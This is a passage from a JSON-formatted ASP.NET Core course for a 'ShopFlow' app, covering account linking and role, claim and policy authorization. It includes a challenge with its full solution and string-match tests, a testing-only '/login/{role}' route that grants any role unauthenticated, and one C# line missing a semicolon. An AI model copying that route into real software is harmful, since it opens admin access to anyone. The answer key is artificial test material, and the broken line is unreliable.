              "content": "Imagine you live in an apartment building with a modern smart lock system. When you first moved in, you were given a physical key - your primary way to enter. Over time, you added more access methods: a fingerprint scan for when your hands are full with groceries, a PIN code for when you forgot your key, a smartphone app that unlocks the door via Bluetooth, and even a key card you keep in your wallet as a backup.\n\nEvery single one of these methods opens the SAME apartment door. They are not creating different apartments for you - they are simply different ways to prove you are authorized to enter YOUR apartment. The physical key does not care that you also have a fingerprint registered. The smartphone app does not invalidate the PIN code. They coexist peacefully, each providing a convenient option depending on your situation.\n\nExternal login providers work identically in ShopFlow. Your ShopFlow account is your apartment - it contains your orders, preferences, shopping cart, and history. Google login is like your fingerprint - quick and convenient when you have your phone. Microsoft login is like your key card - useful when you are on a work computer already signed into Microsoft. GitHub login is like the PIN code - perhaps you use it from your development machine. And a traditional password is like your physical key - the original method that always works.\n\nLinking an external login is exactly like adding a new fingerprint or key card to your apartment's smart lock. You prove you own the apartment (by being already logged in), then you prove you control the new access method (by authenticating with Google), and the building's system creates the connection. From then on, either method opens the same door.\n\nThe security consideration is crucial: you would never let someone add their fingerprint to your apartment lock without proving they already have access, right? That would defeat the entire purpose of having a lock. Similarly, ShopFlow requires you to be authenticated before you can link a new external provider. The act of linking MUST happen from within an authenticated session, never as part of initial registration from an unknown source.\n\nThis pattern - multiple authentication methods pointing to a single identity - is called account linking or identity federation. It provides flexibility for users while maintaining a unified view of their data and permissions."
            },
            {
              "type": "EXAMPLE",
              "title": "Linking Accounts Flow",
              "content": "This example demonstrates two common scenarios: a user with password authentication adding Google login, and a user authenticated via Google adding password-based login.",
              "code": "// ===== EXTERNAL LOGINS TABLE (Entity Framework) =====\npublic class ExternalLogin\n{\n    public int Id { get; set; }\n    public int UserId { get; set; }\n    public string Provider { get; set; } = default!;  // \"Google\", \"Microsoft\", \"GitHub\"\n    public string ProviderKey { get; set; } = default!;  // User's ID at the provider\n    public string? ProviderDisplayName { get; set; }  // Friendly name for UI\n    public DateTime CreatedAt { get; set; }\n    \n    public User User { get; set; } = default!;\n}\n\npublic class User\n{\n    public int Id { get; set; }\n    public string Email { get; set; } = default!;\n    public string? PasswordHash { get; set; }  // Null if user only uses external login\n    public string DisplayName { get; set; } = default!;\n    public DateTime CreatedAt { get; set; }\n    public DateTime? LastLoginAt { get; set; }\n    \n    public ICollection<ExternalLogin> ExternalLogins { get; set; } = new List<ExternalLogin>();\n}\n\n// ===== ACCOUNT LINKING ENDPOINTS =====\nusing Microsoft.AspNetCore.Authentication;\nusing Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.Google;\nusing Microsoft.EntityFrameworkCore;\nusing System.Security.Claims;\n\npublic static class AccountLinkingEndpoints\n{\n    public static void MapAccountLinkingEndpoints(this WebApplication app)\n    {\n        // Get currently linked external logins\n        app.MapGet(\"/api/account/external-logins\", async (\n            ClaimsPrincipal user,\n            ShopFlowDbContext db) =>\n        {\n            var userId = int.Parse(user.FindFirstValue(\"user_id\")!);\n            \n            var logins = await db.ExternalLogins\n                .Where(el => el.UserId == userId)\n                .Select(el => new\n                {\n                    el.Provider,\n                    el.ProviderDisplayName,\n                    LinkedAt = el.CreatedAt\n                })\n                .ToListAsync();\n            \n            return Results.Ok(logins);\n        }).RequireAuthorization();\n        \n        // Initiate linking a new external provider\n        app.MapGet(\"/api/account/link/{provider}\", (\n            string provider,\n            HttpContext context) =>\n        {\n            // Validate provider is supported\n            var validProviders = new[] { \"Google\", \"Microsoft\", \"GitHub\" };\n            if (!validProviders.Contains(provider, StringComparer.OrdinalIgnoreCase))\n            {\n                return Results.BadRequest($\"Unsupported provider: {provider}\");\n            }\n            \n            // Generate a linking token to track this specific linking attempt\n            var linkingToken = Guid.NewGuid().ToString();\n            context.Session.SetString(\"LinkingToken\", linkingToken);\n            context.Session.SetString(\"LinkingProvider\", provider);\n            \n            var properties = new AuthenticationProperties\n            {\n                RedirectUri = $\"/api/account/link-callback?token={linkingToken}\",\n                Items = { { \"LoginProvider\", provider } }\n            };\n            \n            // Challenge with the external provider\n            // User is already logged in, this just adds a new external login\n            return Results.Challenge(properties, new[] { $\"{provider}\" });\n        }).RequireAuthorization();\n        \n        // Callback after external authentication for linking\n        app.MapGet(\"/api/account/link-callback\", async (\n            string token,\n            HttpContext context,\n            ShopFlowDbContext db,\n            ILogger<Program> logger) =>\n        {\n            // Verify the linking token matches\n            var storedToken = context.Session.GetString(\"LinkingToken\");\n            var provider = context.Session.GetString(\"LinkingProvider\");\n            \n            if (storedToken != token || string.IsNullOrEmpty(provider))\n            {\n                logger.LogWarning(\"Invalid linking token or missing provider\");\n                return Results.BadRequest(\"Invalid linking request\");\n            }\n            \n            // Get the current user's ID (they must be authenticated)\n            var currentUserId = int.Parse(\n                context.User.FindFirstValue(\"user_id\")\n                ?? throw new InvalidOperationException(\"User not authenticated\"));\n            \n            // Get the external authentication result\n            var authenticateResult = await context.AuthenticateAsync(provider);\n            if (!authenticateResult.Succeeded)\n            {\n                logger.LogWarning(\"External authentication failed during linking\");\n                return Results.Redirect(\"/account/settings?error=link_failed\");\n            }\n            \n            var externalPrincipal = authenticateResult.Principal!;\n            var providerKey = externalPrincipal.FindFirstValue(ClaimTypes.NameIdentifier)!\n            var email = externalPrincipal.FindFirstValue(ClaimTypes.Email);\n            var name = externalPrincipal.FindFirstValue(ClaimTypes.Name) ?? email;\n            \n            // Check if this external login is already linked to ANY account\n            var existingLogin = await db.ExternalLogins\n                .FirstOrDefaultAsync(el => \n                    el.Provider == provider && \n                    el.ProviderKey == providerKey);\n            \n            if (existingLogin != null)\n            {\n                if (existingLogin.UserId == currentUserId)\n                {\n                    // Already linked to this account\n                    return Results.Redirect(\"/account/settings?info=already_linked\");\n                }\n                else\n                {\n                    // Linked to a different account!\n                    logger.LogWarning(\n                        \"Attempted to link {Provider}:{Key} to user {UserId}, \" +\n                        \"but already linked to user {ExistingUserId}\",\n                        provider, providerKey, currentUserId, existingLogin.UserId);\n                    \n                    return Results.Redirect(\"/account/settings?error=already_linked_other\");\n                }\n            }\n            \n            // Create the new external login link\n            var newLogin = new ExternalLogin\n            {\n                UserId = currentUserId,\n                Provider = provider,\n                ProviderKey = providerKey,\n                ProviderDisplayName = name,\n                CreatedAt = DateTime.UtcNow\n            };\n            \n            db.ExternalLogins.Add(newLogin);\n            await db.SaveChangesAsync();\n            \n            logger.LogInformation(\n                \"User {UserId} linked {Provider} account ({Key})\",\n                currentUserId, provider, providerKey);\n            \n            // Clean up session\n            context.Session.Remove(\"LinkingToken\");\n            context.Session.Remove(\"LinkingProvider\");\n            \n            return Results.Redirect(\"/account/settings?success=provider_linked\");\n        }).RequireAuthorization();\n        \n        // Add password to an account that only has external login\n        app.MapPost(\"/api/account/add-password\", async (\n            AddPasswordRequest request,\n            ClaimsPrincipal user,\n            ShopFlowDbContext db,\n            IPasswordHasher passwordHasher) =>\n        {\n            var userId = int.Parse(user.FindFirstValue(\"user_id\")!);\n            \n            var dbUser = await db.Users.FindAsync(userId);\n            if (dbUser == null)\n            {\n                return Results.NotFound();\n            }\n            \n            // Only allow adding password if user doesn't have one\n            if (!string.IsNullOrEmpty(dbUser.PasswordHash))\n            {\n                return Results.BadRequest(\"Account already has a password. Use change-password instead.\");\n            }\n            \n            // Validate password meets requirements\n            if (request.Password.Length < 8)\n            {\n                return Results.BadRequest(\"Password must be at least 8 characters.\");\n            }\n            \n            if (request.Password != request.ConfirmPassword)\n            {\n                return Results.BadRequest(\"Passwords do not match.\");\n            }\n            \n            // Hash and store password\n            dbUser.PasswordHash = passwordHasher.HashPassword(request.Password);\n            await db.SaveChangesAsync();\n            \n            return Results.Ok(new { Message = \"Password added successfully\" });\n        }).RequireAuthorization();\n    }\n}\n\npublic record AddPasswordRequest(string Password, string ConfirmPassword);",
              "language": "csharp"
            },
            {
              "type": "EXAMPLE",
              "title": "Handling Account Conflicts",
              "content": "When a user tries to link an external login whose email already exists, you need to handle the conflict carefully to prevent account takeover.",
              "code": "// ===== HANDLING EMAIL CONFLICTS DURING OAUTH SIGN-IN =====\n\npublic class OAuthSignInHandler\n{\n    private readonly ShopFlowDbContext _db;\n    private readonly ILogger<OAuthSignInHandler> _logger;\n    \n    public OAuthSignInHandler(ShopFlowDbContext db, ILogger<OAuthSignInHandler> logger)\n    {\n        _db = db;\n        _logger = logger;\n    }\n    \n    public async Task<SignInResult> HandleExternalLoginAsync(\n        string provider,\n        string providerKey,\n        string? email,\n        string? name,\n        bool emailVerified)\n    {\n        // Step 1: Check if this external login already exists\n        var existingLogin = await _db.ExternalLogins\n            .Include(el => el.User)\n            .FirstOrDefaultAsync(el => \n                el.Provider == provider && \n                el.ProviderKey == providerKey);\n        \n        if (existingLogin != null)\n        {\n            // Known user - just sign them in\n            _logger.LogInformation(\n                \"Existing user {UserId} signed in via {Provider}\",\n                existingLogin.UserId, provider);\n            \n            return SignInResult.Success(existingLogin.User);\n        }\n        \n        // Step 2: New external login - check for email conflicts\n        if (!string.IsNullOrEmpty(email))\n        {\n            var existingUserWithEmail = await _db.Users\n                .Include(u => u.ExternalLogins)\n                .FirstOrDefaultAsync(u => u.Email == email);\n            \n            if (existingUserWithEmail != null)\n            {\n                // Email conflict! An account with this email exists.\n                // This could be:\n                // 1. The same person wanting to add another login method\n                // 2. Someone trying to hijack another user's account\n                \n                if (!emailVerified)\n                {\n                    // DANGER: Unverified email from external provider\n                    // Do NOT auto-link - require explicit verification\n                    _logger.LogWarning(\n                        \"Blocked unverified {Provider} login for existing email {Email}\",\n                        provider, email);\n                    \n                    return SignInResult.RequiresEmailVerification(\n                        \"This email is already registered. Please sign in with your \" +\n                        \"existing method and link this provider from account settings.\");\n                }\n                \n                // Email IS verified by provider\n                // Options based on your security policy:\n                \n                // OPTION A: Still require explicit linking (most secure)\n                return SignInResult.RequiresLinking(\n                    existingUserWithEmail.Id,\n                    $\"An account with email {email} already exists. \" +\n                    $\"Sign in with your existing method to link {provider}.\");\n                \n                // OPTION B: Auto-link if provider verifies email (convenient but riskier)\n                // Uncomment below to enable:\n                /*\n                var newLogin = new ExternalLogin\n                {\n                    UserId = existingUserWithEmail.Id,\n                    Provider = provider,\n                    ProviderKey = providerKey,\n                    ProviderDisplayName = name,\n                    CreatedAt = DateTime.UtcNow\n                };\n                _db.ExternalLogins.Add(newLogin);\n                await _db.SaveChangesAsync();\n                \n                _logger.LogInformation(\n                    \"Auto-linked verified {Provider} to existing user {UserId}\",\n                    provider, existingUserWithEmail.Id);\n                \n                return SignInResult.Success(existingUserWithEmail);\n                */\n            }\n        }\n        \n        // Step 3: Completely new user - create account\n        var newUser = new User\n        {\n            Email = email ?? $\"{providerKey}@{provider.ToLower()}.external\",\n            DisplayName = name ?? \"User\",\n            CreatedAt = DateTime.UtcNow,\n            LastLoginAt = DateTime.UtcNow,\n            ExternalLogins = new List<ExternalLogin>\n            {\n                new ExternalLogin\n                {\n                    Provider = provider,\n                    ProviderKey = providerKey,\n                    ProviderDisplayName = name,\n                    CreatedAt = DateTime.UtcNow\n                }\n            }\n        };\n        \n        _db.Users.Add(newUser);\n        await _db.SaveChangesAsync();\n        \n        _logger.LogInformation(\n            \"Created new user {UserId} via {Provider}\",\n            newUser.Id, provider);\n        \n        return SignInResult.Success(newUser);\n    }\n}\n\npublic class SignInResult\n{\n    public bool Succeeded { get; init; }\n    public User? User { get; init; }\n    public string? ErrorMessage { get; init; }\n    public int? ExistingUserId { get; init; }\n    public SignInResultType Type { get; init; }\n    \n    public static SignInResult Success(User user) => new()\n    {\n        Succeeded = true,\n        User = user,\n        Type = SignInResultType.Success\n    };\n    \n    public static SignInResult RequiresLinking(int existingUserId, string message) => new()\n    {\n        Succeeded = false,\n        ExistingUserId = existingUserId,\n        ErrorMessage = message,\n        Type = SignInResultType.RequiresLinking\n    };\n    \n    public static SignInResult RequiresEmailVerification(string message) => new()\n    {\n        Succeeded = false,\n        ErrorMessage = message,\n        Type = SignInResultType.RequiresEmailVerification\n    };\n}\n\npublic enum SignInResultType\n{\n    Success,\n    RequiresLinking,\n    RequiresEmailVerification,\n    Failed\n}",
              "language": "csharp"
            },
            {
              "type": "WARNING",
              "title": "Account Linking Security",
              "content": "## Critical Security Considerations for Account Linking\n\nAccount linking seems straightforward but is actually one of the most security-sensitive features in an authentication system. Improper implementation can lead to account takeover, where an attacker gains full access to a victim's account. Here are the essential security measures you must implement.\n\n**Verify Ownership Before Linking**\n\nThe cardinal rule of account linking: NEVER allow an external login to be linked to an account unless the user has FIRST proven they own that account. This means the user must be authenticated via an EXISTING method before they can add a new one. If a user is logged in with their password and then initiates Google linking, you can be confident they own both the password and the Google account.\n\nNever auto-link based solely on matching email addresses during initial authentication. An attacker could create a Google account with the victim's email (if Google does not verify it, or through other means) and then claim to be that user. Always require the user to prove they can access the existing account first.\n\n**Handle Unverified Emails with Extreme Caution**\n\nSome OAuth providers do not guarantee email verification. GitHub, for example, allows users to add any email to their account without verification. Even Google has edge cases where email_verified might be false. Before trusting an email claim for linking or merging accounts, explicitly check the email_verified claim. If the email is not verified, treat it as untrusted - either reject the linking attempt or require additional verification.\n\n**Prevent Account Takeover via Linking**\n\nConsider this attack scenario: An attacker knows the victim's email address. The victim has a ShopFlow account with that email. The attacker creates a malicious OAuth account (at a provider with weak email verification) using the victim's email. The attacker then uses that OAuth account to try to authenticate with ShopFlow. If ShopFlow auto-links based on email, the attacker now has access to the victim's account.\n\nDefenses:\n1. Never auto-link based on email from unverified sources\n2. Require multi-factor verification for sensitive operations\n3. Send email notifications when new login methods are added\n4. Allow users to review and remove linked accounts\n\n**Rate Limiting and Monitoring**\n\nImplement rate limiting on linking attempts. An attacker trying to enumerate which emails have accounts could abuse the linking flow. Log all linking attempts (successful and failed) with relevant details for security monitoring. Alert on patterns like multiple failed link attempts to the same target email or rapid linking attempts from the same IP address.\n\n**Unlinking Considerations**\n\nAllow users to unlink external providers, but with safeguards:\n1. Never allow unlinking the LAST authentication method - the user would be locked out\n2. If the user only has external logins and unlinks one, require them to either add a password or link another provider first\n3. Consider requiring re-authentication before unlinking for security\n4. Send notification emails when providers are unlinked\n\n**Token Revocation on Unlink**\n\nWhen a user unlinks an external provider, consider whether you need to revoke any stored tokens. If you saved the user's access token to call provider APIs, delete it when they unlink. The user has explicitly told you they no longer want this connection - respect that completely."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-21-04-challenge-01",
              "title": "Implement Unlink Provider Endpoint",
              "description": "Create a secure endpoint that allows users to remove linked external login providers from their account.",
              "instructions": "Implement a secure endpoint to unlink external authentication providers!\n\nRequirements:\n\n1. Create DELETE /api/account/external-logins/{provider} endpoint\n\n2. Security checks:\n   - User must be authenticated\n   - Verify user actually has this provider linked\n   - CRITICAL: Prevent unlinking if it's the user's ONLY login method\n   - User must have either another external login OR a password set\n\n3. On successful unlink:\n   - Remove the ExternalLogin record from database\n   - Log the action\n   - Return success message\n\n4. Error cases to handle:\n   - Provider not found for this user -> 404\n   - Would leave user with no login method -> 400 with clear error message\n   - Database errors -> 500\n\n5. Use the provided User and ExternalLogin entity models\n\nBonus: Consider what additional security you might add (re-authentication, email notification).",
              "starterCode": "using Microsoft.EntityFrameworkCore;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddDbContext<ShopFlowDbContext>(options =>\n    options.UseInMemoryDatabase(\"ShopFlow\"));\n\nbuilder.Services.AddAuthentication().AddCookie();\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// TODO: Implement DELETE /api/account/external-logins/{provider}\n// \n// Requirements:\n// 1. Get current user's ID from claims (\"user_id\")\n// 2. Find the ExternalLogin record for this user and provider\n// 3. Check if user has at least one other login method:\n//    - Another ExternalLogin, OR\n//    - A password set (PasswordHash is not null)\n// 4. If safe to remove, delete and save\n// 5. Return appropriate responses for each case\n\napp.Run();\n\n// Entity Models (provided)\npublic class User\n{\n    public int Id { get; set; }\n    public string Email { get; set; } = default!;\n    public string? PasswordHash { get; set; }\n    public string DisplayName { get; set; } = default!;\n    public ICollection<ExternalLogin> ExternalLogins { get; set; } = new List<ExternalLogin>();\n}\n\npublic class ExternalLogin\n{\n    public int Id { get; set; }\n    public int UserId { get; set; }\n    public string Provider { get; set; } = default!;\n    public string ProviderKey { get; set; } = default!;\n    public User User { get; set; } = default!;\n}\n\npublic class ShopFlowDbContext : DbContext\n{\n    public ShopFlowDbContext(DbContextOptions<ShopFlowDbContext> options) : base(options) { }\n    public DbSet<User> Users => Set<User>();\n    public DbSet<ExternalLogin> ExternalLogins => Set<ExternalLogin>();\n}",
              "solution": "using Microsoft.EntityFrameworkCore;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddDbContext<ShopFlowDbContext>(options =>\n    options.UseInMemoryDatabase(\"ShopFlow\"));\n\nbuilder.Services.AddAuthentication().AddCookie();\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapDelete(\"/api/account/external-logins/{provider}\", async (\n    string provider,\n    ClaimsPrincipal user,\n    ShopFlowDbContext db,\n    ILogger<Program> logger) =>\n{\n    var userId = int.Parse(user.FindFirstValue(\"user_id\")\n        ?? throw new InvalidOperationException(\"User ID claim not found\"));\n    \n    // Find the external login to remove\n    var loginToRemove = await db.ExternalLogins\n        .FirstOrDefaultAsync(el => \n            el.UserId == userId && \n            el.Provider.ToLower() == provider.ToLower());\n    \n    if (loginToRemove == null)\n    {\n        return Results.NotFound(new { Error = $\"Provider '{provider}' is not linked to your account.\" });\n    }\n    \n    // Get user with all their login methods\n    var dbUser = await db.Users\n        .Include(u => u.ExternalLogins)\n        .FirstOrDefaultAsync(u => u.Id == userId);\n    \n    if (dbUser == null)\n    {\n        return Results.NotFound(new { Error = \"User not found.\" });\n    }\n    \n    // Check if user would have any login method remaining\n    var hasPassword = !string.IsNullOrEmpty(dbUser.PasswordHash);\n    var otherLoginsCount = dbUser.ExternalLogins.Count(el => el.Id != loginToRemove.Id);\n    \n    if (!hasPassword && otherLoginsCount == 0)\n    {\n        return Results.BadRequest(new \n        { \n            Error = \"Cannot unlink your only login method. Add a password or link another provider first.\",\n            HasPassword = hasPassword,\n            ExternalLoginCount = dbUser.ExternalLogins.Count\n        });\n    }\n    \n    // Safe to remove\n    db.ExternalLogins.Remove(loginToRemove);\n    await db.SaveChangesAsync();\n    \n    logger.LogInformation(\n        \"User {UserId} unlinked {Provider} external login\",\n        userId, provider);\n    \n    return Results.Ok(new \n    { \n        Message = $\"Successfully unlinked {provider} from your account.\",\n        RemainingLogins = otherLoginsCount,\n        HasPassword = hasPassword\n    });\n}).RequireAuthorization();\n\napp.Run();\n\npublic class User\n{\n    public int Id { get; set; }\n    public string Email { get; set; } = default!;\n    public string? PasswordHash { get; set; }\n    public string DisplayName { get; set; } = default!;\n    public ICollection<ExternalLogin> ExternalLogins { get; set; } = new List<ExternalLogin>();\n}\n\npublic class ExternalLogin\n{\n    public int Id { get; set; }\n    public int UserId { get; set; }\n    public string Provider { get; set; } = default!;\n    public string ProviderKey { get; set; } = default!;\n    public User User { get; set; } = default!;\n}\n\npublic class ShopFlowDbContext : DbContext\n{\n    public ShopFlowDbContext(DbContextOptions<ShopFlowDbContext> options) : base(options) { }\n    public DbSet<User> Users => Set<User>();\n    public DbSet<ExternalLogin> ExternalLogins => Set<ExternalLogin>();\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should define DELETE endpoint",
                  "expectedOutput": "MapDelete",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should check for remaining login methods",
                  "expectedOutput": "PasswordHash",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should prevent removing last login method",
                  "expectedOutput": "Cannot unlink your only login method",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should remove external login from database",
                  "expectedOutput": "ExternalLogins.Remove",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Should require authorization",
                  "expectedOutput": "RequireAuthorization",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with app.MapDelete(\"/api/account/external-logins/{provider}\", ...).RequireAuthorization()"
                },
                {
                  "level": 2,
                  "text": "Use FirstOrDefaultAsync to find the external login by userId and provider."
                },
                {
                  "level": 3,
                  "text": "Include the ExternalLogins collection when loading the user to count remaining logins."
                },
                {
                  "level": 4,
                  "text": "Check both hasPassword and otherLoginsCount > 0 before allowing unlink."
                },
                {
                  "level": 5,
                  "text": "Return BadRequest with a clear message explaining why unlink was blocked and what the user should do."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Only checking ExternalLogins count without considering password",
                  "consequence": "A user with a password and one external login cannot unlink the provider, even though they still have password access.",
                  "correction": "Check if user has password OR other external logins before blocking the unlink."
                },
                {
                  "mistake": "Using case-sensitive provider comparison",
                  "consequence": "Request for 'google' fails when stored as 'Google', frustrating users.",
                  "correction": "Use ToLower() or StringComparer.OrdinalIgnoreCase for provider matching."
                },
                {
                  "mistake": "Not including ExternalLogins when loading user",
                  "consequence": "The Count of ExternalLogins is always 0 because the collection wasn't loaded.",
                  "correction": "Use .Include(u => u.ExternalLogins) when querying the user."
                },
                {
                  "mistake": "Forgetting to call SaveChangesAsync after Remove",
                  "consequence": "The external login appears removed but persists in the database.",
                  "correction": "Always await db.SaveChangesAsync() after modifying entities."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-22",
      "title": "Authorization Patterns",
      "description": "Control access to resources with roles, claims, and policies. Implement fine-grained authorization for your ShopFlow application.",
      "difficulty": "intermediate",
      "estimatedHours": 3,
      "lessons": [
        {
          "id": "lesson-22-01",
          "title": "Roles, Claims, and Policies (Who Can Do What)",
          "moduleId": "module-22",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding Authorization",
              "content": "Imagine visiting a theme park where different wristbands grant access to different attractions. A basic wristband lets you enjoy the main rides and shows. A premium wristband adds access to VIP lounges and front-of-line privileges. A staff wristband opens doors to employee-only areas, maintenance tunnels, and control rooms. Each wristband color represents a ROLE with specific permissions.\n\nBut theme parks have evolved beyond simple wristband colors. Modern parks issue smart bands that encode CLAIMS - specific facts about you. Your smart band might contain claims like 'height: 140cm' (allowing access to certain roller coasters), 'age: 25' (permitting entry to adult-only venues), 'paid-fastpass: true' (enabling queue skipping), and 'VIP-experience: fireworks-viewing' (granting access to exclusive areas during the show).\n\nNow imagine the security guard at each attraction. They don't just check your wristband color - they evaluate POLICIES. The roller coaster policy might be: 'Allow if (height >= 120cm AND age >= 10) OR (has VIP wristband AND signed waiver)'. This policy combines multiple claims and roles into a single access decision.\n\nResource-based authorization goes even further. The gift shop policy for employee discounts isn't just 'is employee' - it's 'is employee AND this specific purchase is from their assigned department'. The authorization decision depends on both WHO you are and WHAT you're trying to access.\n\nIn software, authentication answers 'Who are you?' but authorization answers 'What are you allowed to do?' Just like the theme park, we layer roles, claims, and policies to create flexible, maintainable access control systems."
            },
            {
              "type": "EXAMPLE",
              "title": "Role-Based and Policy-Based Authorization",
              "content": "This example demonstrates different authorization strategies in ASP.NET Core, from simple role checks to flexible policy-based authorization.",
              "code": "// ===== PROGRAM.CS - AUTHORIZATION CONFIGURATION =====\n\nusing Microsoft.AspNetCore.Authorization;\nusing System.Security.Claims;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddAuthentication(\"Cookie\")\n    .AddCookie(\"Cookie\", options => options.LoginPath = \"/login\");\n\n// Configure Authorization Policies\nbuilder.Services.AddAuthorization(options =>\n{\n    // Simple role-based policy\n    options.AddPolicy(\"RequireAdmin\", policy =>\n        policy.RequireRole(\"Admin\"));\n    \n    // Policy requiring specific claim\n    options.AddPolicy(\"RequireVerifiedEmail\", policy =>\n        policy.RequireClaim(\"email_verified\", \"true\"));\n    \n    // Policy with multiple requirements (AND logic)\n    options.AddPolicy(\"CanManageProducts\", policy =>\n        policy.RequireRole(\"Admin\", \"Manager\")  // Admin OR Manager\n              .RequireClaim(\"department\", \"Products\", \"Inventory\"));  // AND in Products/Inventory dept\n    \n    // Policy with custom assertion\n    options.AddPolicy(\"CanEditProducts\", policy =>\n        policy.RequireAssertion(context =>\n        {\n            var user = context.User;\n            \n            // Admins can always edit\n            if (user.IsInRole(\"Admin\"))\n                return true;\n            \n            // Managers can edit during business hours\n            if (user.IsInRole(\"Manager\"))\n            {\n                var hour = DateTime.Now.Hour;\n                return hour >= 9 && hour < 17; // 9 AM to 5 PM\n            }\n            \n            return false;\n        }));\n    \n    // Age verification policy\n    options.AddPolicy(\"Over18\", policy =>\n        policy.RequireAssertion(context =>\n        {\n            var birthDateClaim = context.User.FindFirst(\"birth_date\")?.Value;\n            if (DateTime.TryParse(birthDateClaim, out var birthDate))\n            {\n                var age = DateTime.Today.Year - birthDate.Year;\n                if (birthDate > DateTime.Today.AddYears(-age)) age--;\n                return age >= 18;\n            }\n            return false;\n        }));\n});\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\n// ===== SIMPLE ROLE-BASED AUTHORIZATION =====\n\n// Only users in Admin role can access\napp.MapGet(\"/admin/dashboard\", () => \"Admin Dashboard\")\n    .RequireAuthorization(\"RequireAdmin\");\n\n// Multiple roles - user must be in at least one\napp.MapGet(\"/management/reports\", [Authorize(Roles = \"Admin,Manager\")] () => \n    \"Management Reports\");\n\n// ===== POLICY-BASED AUTHORIZATION =====\n\napp.MapGet(\"/products/manage\", () => \"Product Management\")\n    .RequireAuthorization(\"CanManageProducts\");\n\napp.MapPut(\"/products/{id}\", (int id) => $\"Updating product {id}\")\n    .RequireAuthorization(\"CanEditProducts\");\n\n// ===== CLAIM-BASED AUTHORIZATION =====\n\napp.MapGet(\"/verified-only\", () => \"Verified Users Area\")\n    .RequireAuthorization(\"RequireVerifiedEmail\");\n\napp.MapGet(\"/adult-content\", () => \"Age-Restricted Content\")\n    .RequireAuthorization(\"Over18\");\n\n// ===== READING CLAIMS IN HANDLERS =====\n\napp.MapGet(\"/my-claims\", (ClaimsPrincipal user) =>\n{\n    var claims = user.Claims.Select(c => new { c.Type, c.Value });\n    return Results.Ok(new\n    {\n        IsAuthenticated = user.Identity?.IsAuthenticated,\n        Name = user.Identity?.Name,\n        Roles = user.Claims\n            .Where(c => c.Type == ClaimTypes.Role)\n            .Select(c => c.Value),\n        AllClaims = claims\n    });\n}).RequireAuthorization();\n\n// Fake login for testing - assigns different roles\napp.MapGet(\"/login/{role}\", async (string role, HttpContext ctx) =>\n{\n    var claims = new List<Claim>\n    {\n        new(ClaimTypes.Name, $\"TestUser_{role}\"),\n        new(ClaimTypes.Email, $\"{role.ToLower()}@shopflow.com\"),\n        new(ClaimTypes.Role, role),\n        new(\"email_verified\", \"true\"),\n        new(\"department\", \"Products\"),\n        new(\"birth_date\", \"1990-01-15\")\n    };\n    \n    var identity = new ClaimsIdentity(claims, \"Cookie\");\n    var principal = new ClaimsPrincipal(identity);\n    \n    await ctx.SignInAsync(\"Cookie\", principal);\n    return Results.Ok($\"Logged in as {role}\");\n});\n\napp.Run();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Authorization Strategies",
              "content": "## Role-Based Authorization (RBAC)\n\nRole-Based Access Control is the simplest and most widely understood authorization model. Users are assigned to roles like 'Admin', 'Manager', or 'Customer', and permissions are granted to roles rather than individual users. This works well when your permission structure maps cleanly to organizational hierarchy.\n\n**Strengths:** Easy to understand, simple to implement, maps to business structures.\n**Weaknesses:** Role explosion (too many roles), coarse-grained (all-or-nothing per role), rigid.\n\nUse RBAC when: Your permissions are relatively simple and align with job functions.\n\n## Claim-Based Authorization\n\nClaims are key-value pairs that describe facts about a user. Unlike roles which are binary (you have it or you don't), claims carry values: 'department: Engineering', 'clearance_level: 3', 'subscription: premium'. Claims come from identity providers and can encode rich information.\n\n**Strengths:** Flexible data model, supports external identity providers, extensible.\n**Weaknesses:** Claims alone don't define permissions - you need logic to interpret them.\n\nUse Claims when: You need to make decisions based on user attributes rather than just group membership.\n\n## Policy-Based Authorization\n\nPolicies are named authorization rules that combine requirements. A policy like 'CanDeleteOrders' might require: (Role is Admin) OR (Role is Manager AND order is from their department AND order is not shipped). Policies centralize authorization logic and make it reusable across your application.\n\n**Strengths:** Reusable rules, testable logic, separation of policy from code, supports complex conditions.\n**Weaknesses:** Learning curve, can become complex, policy definitions scattered from usage.\n\nUse Policies when: You have complex authorization rules that you want to define once and enforce consistently.\n\n## Resource-Based Authorization\n\nSometimes authorization depends not just on who the user is, but on what specific resource they're accessing. 'Can this user edit THIS document?' requires examining both the user's claims and the document's properties (owner, department, status). ASP.NET Core's IAuthorizationHandler pattern enables this.\n\n**Strengths:** Fine-grained control, handles ownership scenarios, context-aware decisions.\n**Weaknesses:** More complex implementation, requires loading resources before authorization, performance considerations.\n\nUse Resource-Based when: Authorization depends on the specific resource being accessed, like 'users can only edit their own posts'.\n\n## Choosing Your Strategy\n\nMost real applications combine these approaches. ShopFlow might use:\n- **Roles** for broad access categories (Admin, Manager, Customer)\n- **Claims** for user attributes (department, subscription tier, verified status)\n- **Policies** for reusable rules (CanManageInventory, CanProcessRefunds)\n- **Resource-Based** for ownership checks (CanEditThisOrder, CanViewThisReport)\n\nStart simple with roles, add claims as needed, extract repeated logic into policies, and implement resource-based checks for ownership scenarios."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Designing Permission Systems",
